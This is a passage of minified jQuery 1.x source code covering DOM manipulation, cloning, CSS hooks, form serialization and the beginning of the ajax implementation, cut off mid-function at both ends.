                    return n && (e = ":not(" + e + ")"), 1 === t.length ? N.find.matchesSelector(t[0], e) ? [t[0]] : [] : N.find.matches(e, t)
                }, dir: function (e, t, n) {
                    var r = [], i = e[t];
                    while (i && 9 !== i.nodeType && (n === a || 1 !== i.nodeType || !N(i).is(n))) 1 === i.nodeType && r.push(i), i = i[t];
                    return r
                }, sibling: function (e, t) {
                    for (var n = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && n.push(e);
                    return n
                }
            });
            var be = "abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",
                xe = / jQuery\d+="(?:null|\d+)"/g, we = RegExp("<(?:" + be + ")[\\s/>]", "i"), Te = /^\s+/,
                Ce = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi, Ne = /<([\w:]+)/,
                ke = /<tbody/i, Ee = /<|&#?\w+;/, Se = /<(?:script|style|link)/i, Ae = /^(?:checkbox|radio)$/i,
                je = /checked\s*(?:[^=]|=\s*.checked.)/i, De = /^$|\/(?:java|ecma)script/i, Le = /^true\/(.*)/,
                He = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g, Me = {
                    option: [1, "<select multiple='multiple'>", "</select>"],
                    legend: [1, "<fieldset>", "</fieldset>"],
                    area: [1, "<map>", "</map>"],
                    param: [1, "<object>", "</object>"],
                    thead: [1, "<table>", "</table>"],
                    tr: [2, "<table><tbody>", "</tbody></table>"],
                    col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
                    td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
                    _default: N.support.htmlSerialize ? [0, "", ""] : [1, "X<div>", "</div>"]
                }, _e = ve(c), qe = _e.appendChild(c.createElement("div"));

            function Oe(e, t) {
                return e.getElementsByTagName(t)[0] || e.appendChild(e.ownerDocument.createElement(t))
            }

            function Fe(e) {
                var t = e.getAttributeNode("type");
                return e.type = (t && t.specified) + "/" + e.type, e
            }

            function Be(e) {
                var t = Le.exec(e.type);
                return t ? e.type = t[1] : e.removeAttribute("type"), e
            }

            function Re(e, t) {
                for (var n, r = 0; null != (n = e[r]); r++) N._data(n, "globalEval", !t || N._data(t[r], "globalEval"))
            }

            function Pe(e, t) {
                if (1 === t.nodeType && N.hasData(e)) {
                    var n, r, i, o = N._data(e), a = N._data(t, o), s = o.events;
                    if (s) for (n in delete a.handle, a.events = {}, s) for (r = 0, i = s[n].length; i > r; r++) N.event.add(t, n, s[n][r]);
                    a.data && (a.data = N.extend({}, a.data))
                }
            }

            function We(e, t) {
                var n, r, i;
                if (1 === t.nodeType) {
                    if (n = t.nodeName.toLowerCase(), !N.support.noCloneEvent && t[N.expando]) {
                        for (r in i = N._data(t), i.events) N.removeEvent(t, r, i.handle);
                        t.removeAttribute(N.expando)
                    }
                    "script" === n && t.text !== e.text ? (Fe(t).text = e.text, Be(t)) : "object" === n ? (t.parentNode && (t.outerHTML = e.outerHTML), N.support.html5Clone && e.innerHTML && !N.trim(t.innerHTML) && (t.innerHTML = e.innerHTML)) : "input" === n && Ae.test(e.type) ? (t.defaultChecked = t.checked = e.checked, t.value !== e.value && (t.value = e.value)) : "option" === n ? t.defaultSelected = t.selected = e.defaultSelected : ("input" === n || "textarea" === n) && (t.defaultValue = e.defaultValue)
                }
            }

            function $e(e, t) {
                var n, r, i = 0,
                    o = typeof e.getElementsByTagName !== l ? e.getElementsByTagName(t || "*") : typeof e.querySelectorAll !== l ? e.querySelectorAll(t || "*") : a;
                if (!o) for (o = [], n = e.childNodes || e; null != (r = n[i]); i++) !t || N.nodeName(r, t) ? o.push(r) : N.merge(o, $e(r, t));
                return t === a || t && N.nodeName(e, t) ? N.merge([e], o) : o
            }

            function Ie(e) {
                Ae.test(e.type) && (e.defaultChecked = e.checked)
            }

            Me.optgroup = Me.option, Me.tbody = Me.tfoot = Me.colgroup = Me.caption = Me.thead, Me.th = Me.td, N.fn.extend({
                text: function (e) {
                    return N.access(this, (function (e) {
                        return e === a ? N.text(this) : this.empty().append((this[0] && this[0].ownerDocument || c).createTextNode(e))
                    }), null, e, arguments.length)
                }, wrapAll: function (e) {
                    if (N.isFunction(e)) return this.each((function (t) {
                        N(this).wrapAll(e.call(this, t))
                    }));
                    if (this[0]) {
                        var t = N(e, this[0].ownerDocument).eq(0).clone(!0);
                        this[0].parentNode && t.insertBefore(this[0]), t.map((function () {
                            var e = this;
                            while (e.firstChild && 1 === e.firstChild.nodeType) e = e.firstChild;
                            return e
                        })).append(this)
                    }
                    return this
                }, wrapInner: function (e) {
                    return N.isFunction(e) ? this.each((function (t) {
                        N(this).wrapInner(e.call(this, t))
                    })) : this.each((function () {
                        var t = N(this), n = t.contents();
                        n.length ? n.wrapAll(e) : t.append(e)
                    }))
                }, wrap: function (e) {
                    var t = N.isFunction(e);
                    return this.each((function (n) {
                        N(this).wrapAll(t ? e.call(this, n) : e)
                    }))
                }, unwrap: function () {
                    return this.parent().each((function () {
                        N.nodeName(this, "body") || N(this).replaceWith(this.childNodes)
                    })).end()
                }, append: function () {
                    return this.domManip(arguments, !0, (function (e) {
                        (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) && this.appendChild(e)
                    }))
                }, prepend: function () {
                    return this.domManip(arguments, !0, (function (e) {
                        (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) && this.insertBefore(e, this.firstChild)
                    }))
                }, before: function () {
                    return this.domManip(arguments, !1, (function (e) {
                        this.parentNode && this.parentNode.insertBefore(e, this)
                    }))
                }, after: function () {
                    return this.domManip(arguments, !1, (function (e) {
                        this.parentNode && this.parentNode.insertBefore(e, this.nextSibling)
                    }))
                }, remove: function (e, t) {
                    for (var n, r = 0; null != (n = this[r]); r++) (!e || N.filter(e, [n]).length > 0) && (t || 1 !== n.nodeType || N.cleanData($e(n)), n.parentNode && (t && N.contains(n.ownerDocument, n) && Re($e(n, "script")), n.parentNode.removeChild(n)));
                    return this
                }, empty: function () {
                    for (var e, t = 0; null != (e = this[t]); t++) {
                        1 === e.nodeType && N.cleanData($e(e, !1));
                        while (e.firstChild) e.removeChild(e.firstChild);
                        e.options && N.nodeName(e, "select") && (e.options.length = 0)
                    }
                    return this
                }, clone: function (e, t) {
                    return e = null != e && e, t = null == t ? e : t, this.map((function () {
                        return N.clone(this, e, t)
                    }))
                }, html: function (e) {
                    return N.access(this, (function (e) {
                        var t = this[0] || {}, n = 0, r = this.length;
                        if (e === a) return 1 === t.nodeType ? t.innerHTML.replace(xe, "") : a;
                        if (!("string" != typeof e || Se.test(e) || !N.support.htmlSerialize && we.test(e) || !N.support.leadingWhitespace && Te.test(e) || Me[(Ne.exec(e) || ["", ""])[1].toLowerCase()])) {
                            e = e.replace(Ce, "<$1></$2>");
                            try {
                                for (; r > n; n++) t = this[n] || {}, 1 === t.nodeType && (N.cleanData($e(t, !1)), t.innerHTML = e);
                                t = 0
                            } catch (c) {
                            }
                        }
                        t && this.empty().append(e)
                    }), null, e, arguments.length)
                }, replaceWith: function (e) {
                    var t = N.isFunction(e);
                    return t || "string" == typeof e || (e = N(e).not(this).detach()), this.domManip([e], !0, (function (e) {
                        var t = this.nextSibling, n = this.parentNode;
                        n && (N(this).remove(), n.insertBefore(e, t))
                    }))
                }, detach: function (e) {
                    return this.remove(e, !0)
                }, domManip: function (e, t, n) {
                    e = y.apply([], e);
                    var r, i, o, s, u, l, c = 0, f = this.length, p = this, d = f - 1, h = e[0], m = N.isFunction(h);
                    if (m || !(1 >= f || "string" != typeof h || N.support.checkClone) && je.test(h)) return this.each((function (r) {
                        var i = p.eq(r);
                        m && (e[0] = h.call(this, r, t ? i.html() : a)), i.domManip(e, t, n)
                    }));
                    if (f && (l = N.buildFragment(e, this[0].ownerDocument, !1, this), r = l.firstChild, 1 === l.childNodes.length && (l = r), r)) {
                        for (t = t && N.nodeName(r, "tr"), s = N.map($e(l, "script"), Fe), o = s.length; f > c; c++) i = l, c !== d && (i = N.clone(i, !0, !0), o && N.merge(s, $e(i, "script"))), n.call(t && N.nodeName(this[c], "table") ? Oe(this[c], "tbody") : this[c], i, c);
                        if (o) for (u = s[s.length - 1].ownerDocument, N.map(s, Be), c = 0; o > c; c++) i = s[c], De.test(i.type || "") && !N._data(i, "globalEval") && N.contains(u, i) && (i.src ? N.ajax({
                            url: i.src,
                            type: "GET",
                            dataType: "script",
                            async: !1,
                            global: !1,
                            throws: !0
                        }) : N.globalEval((i.text || i.textContent || i.innerHTML || "").replace(He, "")));
                        l = r = null
                    }
                    return this
                }
            }), N.each({
                appendTo: "append",
                prependTo: "prepend",
                insertBefore: "before",
                insertAfter: "after",
                replaceAll: "replaceWith"
            }, (function (e, t) {
                N.fn[e] = function (e) {
                    for (var n, r = 0, i = [], o = N(e), a = o.length - 1; a >= r; r++) n = r === a ? this : this.clone(!0), N(o[r])[t](n), v.apply(i, n.get());
                    return this.pushStack(i)
                }
            })), N.extend({
                clone: function (e, t, n) {
                    var r, i, o, a, s, u = N.contains(e.ownerDocument, e);
                    if (N.support.html5Clone || N.isXMLDoc(e) || !we.test("<" + e.nodeName + ">") ? o = e.cloneNode(!0) : (qe.innerHTML = e.outerHTML, qe.removeChild(o = qe.firstChild)), !(N.support.noCloneEvent && N.support.noCloneChecked || 1 !== e.nodeType && 11 !== e.nodeType || N.isXMLDoc(e))) for (r = $e(o), s = $e(e), a = 0; null != (i = s[a]); ++a) r[a] && We(i, r[a]);
                    if (t) if (n) for (s = s || $e(e), r = r || $e(o), a = 0; null != (i = s[a]); a++) Pe(i, r[a]); else Pe(e, o);
                    return r = $e(o, "script"), r.length > 0 && Re(r, !u && $e(e, "script")), r = s = i = null, o
                }, buildFragment: function (e, t, n, r) {
                    for (var i, o, a, s, u, l, c, f = e.length, p = ve(t), d = [], h = 0; f > h; h++) if (o = e[h], o || 0 === o) if ("object" === N.type(o)) N.merge(d, o.nodeType ? [o] : o); else if (Ee.test(o)) {
                        s = s || p.appendChild(t.createElement("div")), u = (Ne.exec(o) || ["", ""])[1].toLowerCase(), c = Me[u] || Me._default, s.innerHTML = c[1] + o.replace(Ce, "<$1></$2>") + c[2], i = c[0];
                        while (i--) s = s.lastChild;
                        if (!N.support.leadingWhitespace && Te.test(o) && d.push(t.createTextNode(Te.exec(o)[0])), !N.support.tbody) {
                            o = "table" !== u || ke.test(o) ? "<table>" !== c[1] || ke.test(o) ? 0 : s : s.firstChild, i = o && o.childNodes.length;
                            while (i--) N.nodeName(l = o.childNodes[i], "tbody") && !l.childNodes.length && o.removeChild(l)
                        }
                        N.merge(d, s.childNodes), s.textContent = "";
                        while (s.firstChild) s.removeChild(s.firstChild);
                        s = p.lastChild
                    } else d.push(t.createTextNode(o));
                    s && p.removeChild(s), N.support.appendChecked || N.grep($e(d, "input"), Ie), h = 0;
                    while (o = d[h++]) if ((!r || -1 === N.inArray(o, r)) && (a = N.contains(o.ownerDocument, o), s = $e(p.appendChild(o), "script"), a && Re(s), n)) {
                        i = 0;
                        while (o = s[i++]) De.test(o.type || "") && n.push(o)
                    }
                    return s = null, p
                }, cleanData: function (e, t) {
                    for (var n, r, i, o, a = 0, s = N.expando, u = N.cache, c = N.support.deleteExpando, f = N.event.special; null != (n = e[a]); a++) if ((t || N.acceptData(n)) && (i = n[s], o = i && u[i])) {
                        if (o.events) for (r in o.events) f[r] ? N.event.remove(n, r) : N.removeEvent(n, r, o.handle);
                        u[i] && (delete u[i], c ? delete n[s] : typeof n.removeAttribute !== l ? n.removeAttribute(s) : n[s] = null, m.push(i))
                    }
                }
            });
            var ze, Xe, Ve, Ue = /alpha\([^)]*\)/i, Ye = /opacity\s*=\s*([^)]*)/, Ge = /^(top|right|bottom|left)$/,
                Je = /^(none|table(?!-c[ea]).+)/, Qe = /^margin/, Ze = RegExp("^(" + k + ")(.*)$", "i"),
                Ke = RegExp("^(" + k + ")(?!px)[a-z%]+$", "i"), et = RegExp("^([+-])=(" + k + ")", "i"),
                tt = {BODY: "block"}, nt = {position: "absolute", visibility: "hidden", display: "block"},
                rt = {letterSpacing: 0, fontWeight: 400}, it = ["Top", "Right", "Bottom", "Left"],
                ot = ["Webkit", "O", "Moz", "ms"];

            function at(e, t) {
                if (t in e) return t;
                var n = t.charAt(0).toUpperCase() + t.slice(1), r = t, i = ot.length;
                while (i--) if (t = ot[i] + n, t in e) return t;
                return r
            }

            function st(e, t) {
                return e = t || e, "none" === N.css(e, "display") || !N.contains(e.ownerDocument, e)
            }

            function ut(e, t) {
                for (var n, r, i, o = [], a = 0, s = e.length; s > a; a++) r = e[a], r.style && (o[a] = N._data(r, "olddisplay"), n = r.style.display, t ? (o[a] || "none" !== n || (r.style.display = ""), "" === r.style.display && st(r) && (o[a] = N._data(r, "olddisplay", pt(r.nodeName)))) : o[a] || (i = st(r), (n && "none" !== n || !i) && N._data(r, "olddisplay", i ? n : N.css(r, "display"))));
                for (a = 0; s > a; a++) r = e[a], r.style && (t && "none" !== r.style.display && "" !== r.style.display || (r.style.display = t ? o[a] || "" : "none"));
                return e
            }

            function lt(e, t, n) {
                var r = Ze.exec(t);
                return r ? Math.max(0, r[1] - (n || 0)) + (r[2] || "px") : t
            }

            function ct(e, t, n, r, i) {
                for (var o = n === (r ? "border" : "content") ? 4 : "width" === t ? 1 : 0, a = 0; 4 > o; o += 2) "margin" === n && (a += N.css(e, n + it[o], !0, i)), r ? ("content" === n && (a -= N.css(e, "padding" + it[o], !0, i)), "margin" !== n && (a -= N.css(e, "border" + it[o] + "Width", !0, i))) : (a += N.css(e, "padding" + it[o], !0, i), "padding" !== n && (a += N.css(e, "border" + it[o] + "Width", !0, i)));
                return a
            }

            function ft(e, t, n) {
                var r = !0, i = "width" === t ? e.offsetWidth : e.offsetHeight, o = Xe(e),
                    a = N.support.boxSizing && "border-box" === N.css(e, "boxSizing", !1, o);
                if (0 >= i || null == i) {
                    if (i = Ve(e, t, o), (0 > i || null == i) && (i = e.style[t]), Ke.test(i)) return i;
                    r = a && (N.support.boxSizingReliable || i === e.style[t]), i = parseFloat(i) || 0
                }
                return i + ct(e, t, n || (a ? "border" : "content"), r, o) + "px"
            }

            function pt(e) {
                var t = c, n = tt[e];
                return n || (n = dt(e, t), "none" !== n && n || (ze = (ze || N("<iframe frameborder='0' width='0' height='0'/>").css("cssText", "display:block !important")).appendTo(t.documentElement), t = (ze[0].contentWindow || ze[0].contentDocument).document, t.write("<!doctype html><html><body>"), t.close(), n = dt(e, t), ze.detach()), tt[e] = n), n
            }

            function dt(e, t) {
                var n = N(t.createElement(e)).appendTo(t.body), r = N.css(n[0], "display");
                return n.remove(), r
            }

            N.fn.extend({
                css: function (e, t) {
                    return N.access(this, (function (e, t, n) {
                        var r, i, o = {}, s = 0;
                        if (N.isArray(t)) {
                            for (i = Xe(e), r = t.length; r > s; s++) o[t[s]] = N.css(e, t[s], !1, i);
                            return o
                        }
                        return n !== a ? N.style(e, t, n) : N.css(e, t)
                    }), e, t, arguments.length > 1)
                }, show: function () {
                    return ut(this, !0)
                }, hide: function () {
                    return ut(this)
                }, toggle: function (e) {
                    var t = "boolean" == typeof e;
                    return this.each((function () {
                        (t ? e : st(this)) ? N(this).show() : N(this).hide()
                    }))
                }
            }), N.extend({
                cssHooks: {
                    opacity: {
                        get: function (e, t) {
                            if (t) {
                                var n = Ve(e, "opacity");
                                return "" === n ? "1" : n
                            }
                        }
                    }
                },
                cssNumber: {
                    columnCount: !0,
                    fillOpacity: !0,
                    fontWeight: !0,
                    lineHeight: !0,
                    opacity: !0,
                    orphans: !0,
                    widows: !0,
                    zIndex: !0,
                    zoom: !0
                },
                cssProps: {float: N.support.cssFloat ? "cssFloat" : "styleFloat"},
                style: function (e, t, n, r) {
                    if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
                        var i, o, s, u = N.camelCase(t), l = e.style;
                        if (t = N.cssProps[u] || (N.cssProps[u] = at(l, u)), s = N.cssHooks[t] || N.cssHooks[u], n === a) return s && "get" in s && (i = s.get(e, !1, r)) !== a ? i : l[t];
                        if (o = typeof n, "string" === o && (i = et.exec(n)) && (n = (i[1] + 1) * i[2] + parseFloat(N.css(e, t)), o = "number"), !(null == n || "number" === o && isNaN(n) || ("number" !== o || N.cssNumber[u] || (n += "px"), N.support.clearCloneStyle || "" !== n || 0 !== t.indexOf("background") || (l[t] = "inherit"), s && "set" in s && (n = s.set(e, n, r)) === a))) try {
                            l[t] = n
                        } catch (m) {
                        }
                    }
                },
                css: function (e, t, n, r) {
                    var i, o, s, u = N.camelCase(t);
                    return t = N.cssProps[u] || (N.cssProps[u] = at(e.style, u)), s = N.cssHooks[t] || N.cssHooks[u], s && "get" in s && (o = s.get(e, !0, n)), o === a && (o = Ve(e, t, r)), "normal" === o && t in rt && (o = rt[t]), "" === n || n ? (i = parseFloat(o), !0 === n || N.isNumeric(i) ? i || 0 : o) : o
                },
                swap: function (e, t, n, r) {
                    var i, o, a = {};
                    for (o in t) a[o] = e.style[o], e.style[o] = t[o];
                    for (o in i = n.apply(e, r || []), t) e.style[o] = a[o];
                    return i
                }
            }), o.getComputedStyle ? (Xe = function (e) {
                return o.getComputedStyle(e, null)
            }, Ve = function (e, t, n) {
                var r, i, o, s = n || Xe(e), u = s ? s.getPropertyValue(t) || s[t] : a, l = e.style;
                return s && ("" !== u || N.contains(e.ownerDocument, e) || (u = N.style(e, t)), Ke.test(u) && Qe.test(t) && (r = l.width, i = l.minWidth, o = l.maxWidth, l.minWidth = l.maxWidth = l.width = u, u = s.width, l.width = r, l.minWidth = i, l.maxWidth = o)), u
            }) : c.documentElement.currentStyle && (Xe = function (e) {
                return e.currentStyle
            }, Ve = function (e, t, n) {
                var r, i, o, s = n || Xe(e), u = s ? s[t] : a, l = e.style;
                return null == u && l && l[t] && (u = l[t]), Ke.test(u) && !Ge.test(t) && (r = l.left, i = e.runtimeStyle, o = i && i.left, o && (i.left = e.currentStyle.left), l.left = "fontSize" === t ? "1em" : u, u = l.pixelLeft + "px", l.left = r, o && (i.left = o)), "" === u ? "auto" : u
            }), N.each(["height", "width"], (function (e, t) {
                N.cssHooks[t] = {
                    get: function (e, n, r) {
                        return n ? 0 === e.offsetWidth && Je.test(N.css(e, "display")) ? N.swap(e, nt, (function () {
                            return ft(e, t, r)
                        })) : ft(e, t, r) : a
                    }, set: function (e, n, r) {
                        var i = r && Xe(e);
                        return lt(e, n, r ? ct(e, t, r, N.support.boxSizing && "border-box" === N.css(e, "boxSizing", !1, i), i) : 0)
                    }
                }
            })), N.support.opacity || (N.cssHooks.opacity = {
                get: function (e, t) {
                    return Ye.test((t && e.currentStyle ? e.currentStyle.filter : e.style.filter) || "") ? .01 * parseFloat(RegExp.$1) + "" : t ? "1" : ""
                }, set: function (e, t) {
                    var n = e.style, r = e.currentStyle, i = N.isNumeric(t) ? "alpha(opacity=" + 100 * t + ")" : "",
                        o = r && r.filter || n.filter || "";
                    n.zoom = 1, (t >= 1 || "" === t) && "" === N.trim(o.replace(Ue, "")) && n.removeAttribute && (n.removeAttribute("filter"), "" === t || r && !r.filter) || (n.filter = Ue.test(o) ? o.replace(Ue, i) : o + " " + i)
                }
            }), N((function () {
                N.support.reliableMarginRight || (N.cssHooks.marginRight = {
                    get: function (e, t) {
                        return t ? N.swap(e, {display: "inline-block"}, Ve, [e, "marginRight"]) : a
                    }
                }), !N.support.pixelPosition && N.fn.position && N.each(["top", "left"], (function (e, t) {
                    N.cssHooks[t] = {
                        get: function (e, n) {
                            return n ? (n = Ve(e, t), Ke.test(n) ? N(e).position()[t] + "px" : n) : a
                        }
                    }
                }))
            })), N.expr && N.expr.filters && (N.expr.filters.hidden = function (e) {
                return 0 >= e.offsetWidth && 0 >= e.offsetHeight || !N.support.reliableHiddenOffsets && "none" === (e.style && e.style.display || N.css(e, "display"))
            }, N.expr.filters.visible = function (e) {
                return !N.expr.filters.hidden(e)
            }), N.each({margin: "", padding: "", border: "Width"}, (function (e, t) {
                N.cssHooks[e + t] = {
                    expand: function (n) {
                        for (var r = 0, i = {}, o = "string" == typeof n ? n.split(" ") : [n]; 4 > r; r++) i[e + it[r] + t] = o[r] || o[r - 2] || o[0];
                        return i
                    }
                }, Qe.test(e) || (N.cssHooks[e + t].set = lt)
            }));
            var ht = /%20/g, mt = /\[\]$/, gt = /\r?\n/g, yt = /^(?:submit|button|image|reset|file)$/i,
                vt = /^(?:input|select|textarea|keygen)/i;

            function bt(e, t, n, r) {
                var i;
                if (N.isArray(t)) N.each(t, (function (t, i) {
                    n || mt.test(e) ? r(e, i) : bt(e + "[" + ("object" == typeof i ? t : "") + "]", i, n, r)
                })); else if (n || "object" !== N.type(t)) r(e, t); else for (i in t) bt(e + "[" + i + "]", t[i], n, r)
            }

            N.fn.extend({
                serialize: function () {
                    return N.param(this.serializeArray())
                }, serializeArray: function () {
                    return this.map((function () {
                        var e = N.prop(this, "elements");
                        return e ? N.makeArray(e) : this
                    })).filter((function () {
                        var e = this.type;
                        return this.name && !N(this).is(":disabled") && vt.test(this.nodeName) && !yt.test(e) && (this.checked || !Ae.test(e))
                    })).map((function (e, t) {
                        var n = N(this).val();
                        return null == n ? null : N.isArray(n) ? N.map(n, (function (e) {
                            return {name: t.name, value: e.replace(gt, "\r\n")}
                        })) : {name: t.name, value: n.replace(gt, "\r\n")}
                    })).get()
                }
            }), N.param = function (e, t) {
                var n, r = [], i = function (e, t) {
                    t = N.isFunction(t) ? t() : null == t ? "" : t, r[r.length] = encodeURIComponent(e) + "=" + encodeURIComponent(t)
                };
                if (t === a && (t = N.ajaxSettings && N.ajaxSettings.traditional), N.isArray(e) || e.jquery && !N.isPlainObject(e)) N.each(e, (function () {
                    i(this.name, this.value)
                })); else for (n in e) bt(n, e[n], t, i);
                return r.join("&").replace(ht, "+")
            }, N.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), (function (e, t) {
                N.fn[t] = function (e, n) {
                    return arguments.length > 0 ? this.on(t, null, e, n) : this.trigger(t)
                }
            })), N.fn.hover = function (e, t) {
                return this.mouseenter(e).mouseleave(t || e)
            };
            var xt, wt, Tt = N.now(), Ct = /\?/, Nt = /#.*$/, kt = /([?&])_=[^&]*/,
                Et = /^(.*?):[ \t]*([^\r\n]*)\r?$/gm, St = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
                At = /^(?:GET|HEAD)$/, jt = /^\/\//, Dt = /^([\w.+-]+:)(?:\/\/([^\/?#:]*)(?::(\d+)|)|)/, Lt = N.fn.load,
                Ht = {}, Mt = {}, _t = "*/".concat("*");
            try {
                wt = f.href
            } catch (cn) {
                wt = c.createElement("a"), wt.href = "", wt = wt.href
            }

            function qt(e) {
                return function (t, n) {
                    "string" != typeof t && (n = t, t = "*");
                    var r, i = 0, o = t.toLowerCase().match(E) || [];
                    if (N.isFunction(n)) while (r = o[i++]) "+" === r[0] ? (r = r.slice(1) || "*", (e[r] = e[r] || []).unshift(n)) : (e[r] = e[r] || []).push(n)
                }
            }

            function Ot(e, t, n, r) {
                var i = {}, o = e === Mt;

                function s(u) {
                    var l;
                    return i[u] = !0, N.each(e[u] || [], (function (e, u) {
                        var c = u(t, n, r);
                        return "string" != typeof c || o || i[c] ? o ? !(l = c) : a : (t.dataTypes.unshift(c), s(c), !1)
                    })), l
                }

                return s(t.dataTypes[0]) || !i["*"] && s("*")
            }

            function Ft(e, t) {
                var n, r, i = N.ajaxSettings.flatOptions || {};
                for (r in t) t[r] !== a && ((i[r] ? e : n || (n = {}))[r] = t[r]);
                return n && N.extend(!0, e, n), e
            }

            function Bt(e, t, n) {
                var r, i, o, s, u = e.contents, l = e.dataTypes, c = e.responseFields;
                for (s in c) s in n && (t[c[s]] = n[s]);
                while ("*" === l[0]) l.shift(), i === a && (i = e.mimeType || t.getResponseHeader("Content-Type"));
                if (i) for (s in u) if (u[s] && u[s].test(i)) {
                    l.unshift(s);
                    break
                }
                if (l[0] in n) o = l[0]; else {
                    for (s in n) {
                        if (!l[0] || e.converters[s + " " + l[0]]) {
                            o = s;
                            break
                        }
                        r || (r = s)
                    }
                    o = o || r
                }
                return o ? (o !== l[0] && l.unshift(o), n[o]) : a
            }

            function Rt(e, t) {
                var n, r, i, o, a = {}, s = 0, u = e.dataTypes.slice(), l = u[0];
                if (e.dataFilter && (t = e.dataFilter(t, e.dataType)), u[1]) for (i in e.converters) a[i.toLowerCase()] = e.converters[i];
                for (; r = u[++s];) if ("*" !== r) {
                    if ("*" !== l && l !== r) {
                        if (i = a[l + " " + r] || a["* " + r], !i) for (n in a) if (o = n.split(" "), o[1] === r && (i = a[l + " " + o[0]] || a["* " + o[0]])) {
                            !0 === i ? i = a[n] : !0 !== a[n] && (r = o[0], u.splice(s--, 0, r));
                            break
                        }
                        if (!0 !== i) if (i && e["throws"]) t = i(t); else try {
                            t = i(t)
                        } catch (m) {
                            return {state: "parsererror", error: i ? m : "No conversion from " + l + " to " + r}
                        }
                    }
                    l = r
                }
                return {state: "success", data: t}
            }

            xt = Dt.exec(wt.toLowerCase()) || [], N.fn.load = function (e, t, n) {
                if ("string" != typeof e && Lt) return Lt.apply(this, arguments);
                var r, i, o, s = this, u = e.indexOf(" ");
                return u >= 0 && (r = e.slice(u, e.length), e = e.slice(0, u)), N.isFunction(t) ? (n = t, t = a) : t && "object" == typeof t && (o = "POST"), s.length > 0 && N.ajax({
                    url: e,
                    type: o,
                    dataType: "html",
                    data: t
                }).done((function (e) {
                    i = arguments, s.html(r ? N("<div>").append(N.parseHTML(e)).find(r) : e)
                })).complete(n && function (e, t) {
                    s.each(n, i || [e.responseText, t, e])
                }), this
            }, N.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], (function (e, t) {
                N.fn[t] = function (e) {
                    return this.on(t, e)
                }
            })), N.each(["get", "post"], (function (e, t) {
                N[t] = function (e, n, r, i) {
                    return N.isFunction(n) && (i = i || r, r = n, n = a), N.ajax({
                        url: e,
                        type: t,
                        dataType: i,
                        data: n,
                        success: r
                    })
                }
            })), N.extend({
                active: 0,
                lastModified: {},
                etag: {},
                ajaxSettings: {
                    url: wt,
                    type: "GET",
                    isLocal: St.test(xt[1]),
                    global: !0,
                    processData: !0,
                    async: !0,
                    contentType: "application/x-www-form-urlencoded; charset=UTF-8",
                    accepts: {
                        "*": _t,
                        text: "text/plain",
                        html: "text/html",
                        xml: "application/xml, text/xml",
                        json: "application/json, text/javascript"
                    },
                    contents: {xml: /xml/, html: /html/, json: /json/},
                    responseFields: {xml: "responseXML", text: "responseText"},
                    converters: {"* text": o.String, "text html": !0, "text json": N.parseJSON, "text xml": N.parseXML},
                    flatOptions: {url: !0, context: !0}
                },
                ajaxSetup: function (e, t) {
                    return t ? Ft(Ft(e, N.ajaxSettings), t) : Ft(N.ajaxSettings, e)
                },
                ajaxPrefilter: qt(Ht),
                ajaxTransport: qt(Mt),
                ajax: function (e, t) {
                    "object" == typeof e && (t = e, e = a), t = t || {};
                    var n, r, i, o, s, u, l, c, f = N.ajaxSetup({}, t), p = f.context || f,
                        d = f.context && (p.nodeType || p.jquery) ? N(p) : N.event, h = N.Deferred(),
                        m = N.Callbacks("once memory"), g = f.statusCode || {}, y = {}, v = {}, b = 0, x = "canceled",
                        w = {
                            readyState: 0, getResponseHeader: function (e) {
                                var t;
                                if (2 === b) {
                                    if (!c) {
                                        c = {};
                                        while (t = Et.exec(o)) c[t[1].toLowerCase()] = t[2]
                                    }
                                    t = c[e.toLowerCase()]
                                }
                                return null == t ? null : t
                            }, getAllResponseHeaders: function () {
                                return 2 === b ? o : null
                            }, setRequestHeader: function (e, t) {
                                var n = e.toLowerCase();
                                return b || (e = v[n] = v[n] || e, y[e] = t), this
                            }, overrideMimeType: function (e) {
                                return b || (f.mimeType = e), this
                            }, statusCode: function (e) {
                                var t;
                                if (e) if (2 > b) for (t in e) g[t] = [g[t], e[t]]; else w.always(e[w.status]);
                                return this
                            }, abort: function (e) {
                                var t = e || x;
                                return l && l.abort(t), T(0, t), this
                            }
                        };
                    if (h.promise(w).complete = m.add, w.success = w.done, w.error = w.fail, f.url = ((e || f.url || wt) + "").replace(Nt, "").replace(jt, xt[1] + "//"), f.type = t.method || t.type || f.method || f.type, f.dataTypes = N.trim(f.dataType || "*").toLowerCase().match(E) || [""], null == f.crossDomain && (n = Dt.exec(f.url.toLowerCase()), f.crossDomain = !(!n || n[1] === xt[1] && n[2] === xt[2] && (n[3] || ("http:" === n[1] ? 80 : 443)) == (xt[3] || ("http:" === xt[1] ? 80 : 443)))), f.data && f.processData && "string" != typeof f.data && (f.data = N.param(f.data, f.traditional)), Ot(Ht, f, t, w), 2 === b) return w;
                    for (r in u = f.global, u && 0 === N.active++ && N.event.trigger("ajaxStart"), f.type = f.type.toUpperCase(), f.hasContent = !At.test(f.type), i = f.url, f.hasContent || (f.data && (i = f.url += (Ct.test(i) ? "&" : "?") + f.data, delete f.data), !1 === f.cache && (f.url = kt.test(i) ? i.replace(kt, "$1_=" + Tt++) : i + (Ct.test(i) ? "&" : "?") + "_=" + Tt++)), f.ifModified && (N.lastModified[i] && w.setRequestHeader("If-Modified-Since", N.lastModified[i]), N.etag[i] && w.setRequestHeader("If-None-Match", N.etag[i])), (f.data && f.hasContent && !1 !== f.contentType || t.contentType) && w.setRequestHeader("Content-Type", f.contentType), w.setRequestHeader("Accept", f.dataTypes[0] && f.accepts[f.dataTypes[0]] ? f.accepts[f.dataTypes[0]] + ("*" !== f.dataTypes[0] ? ", " + _t + "; q=0.01" : "") : f.accepts["*"]), f.headers) w.setRequestHeader(r, f.headers[r]);
